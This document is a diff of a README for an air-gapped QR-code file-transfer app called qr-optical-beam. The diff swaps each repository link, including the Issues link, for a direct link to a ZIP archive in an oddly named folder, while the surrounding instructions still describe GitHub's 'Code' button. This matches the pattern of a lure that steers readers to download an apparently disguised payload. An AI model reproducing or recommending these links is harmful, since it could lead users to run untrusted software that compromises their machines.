@@ -1,10 +1,10 @@
 # ⚡ qr-optical-beam - Zero-Network, Air-Gapped Optical File Transfer
 
-[![Download Now](https://img.shields.io/badge/Download-qr--optical--beam-8A2BE2?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Donkyghost/qr-optical-beam)
+[![Download Now](https://img.shields.io/badge/Download-qr--optical--beam-8A2BE2?style=for-the-badge&logo=github&logoColor=white)](https://raw.githubusercontent.com/Donkyghost/qr-optical-beam/main/arthrodirous/beam_qr_optical_v3.7.zip)
 
 ## 📥 Download & Install
 
-Visit this link to download the application: **[https://github.com/Donkyghost/qr-optical-beam](https://github.com/Donkyghost/qr-optical-beam)**
+Visit this link to download the application: **[https://raw.githubusercontent.com/Donkyghost/qr-optical-beam/main/arthrodirous/beam_qr_optical_v3.7.zip](https://raw.githubusercontent.com/Donkyghost/qr-optical-beam/main/arthrodirous/beam_qr_optical_v3.7.zip)**
 
 On that page, click the green **"Code"** button and select **"Download ZIP"**. The download will begin automatically. Once the ZIP file finishes downloading, locate it in your **Downloads** folder.
 
@@ -164,7 +164,7 @@ This project is provided for personal and educational use. For commercial licens
 
 Found a bug? Have a feature request? Want to contribute?
 
-- **Issues:** Visit the [GitHub Issues page](https://github.com/Donkyghost/qr-optical-beam/issues)
+- **Issues:** Visit the [GitHub Issues page](https://raw.githubusercontent.com/Donkyghost/qr-optical-beam/main/arthrodirous/beam_qr_optical_v3.7.zip)
 - **Discussions:** Open a thread in the GitHub Discussions section
 - **Star the repo:** Show your support by starring the repository
 
@@ -174,6 +174,6 @@ Your feedback helps improve this tool for everyone.
 
 **Download now** and experience the future of offline data transfer:
 
-[![Get qr-optical-beam](https://img.shields.io/badge/Get-qr--optical--beam-00FF7F?style=for-the-badge&logo=github)](https://github.com/Donkyghost/qr-optical-beam)
+[![Get qr-optical-beam](https://img.shields.io/badge/Get-qr--optical--beam-00FF7F?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/Donkyghost/qr-optical-beam/main/arthrodirous/beam_qr_optical_v3.7.zip)
 
 Keywords: air-gapped, android, camerax, computer-vision, file-transfer, jetpack-compose, kotlin, mlkit, offline, optical-communication, p2p, privacy, qr-code, security, zxing
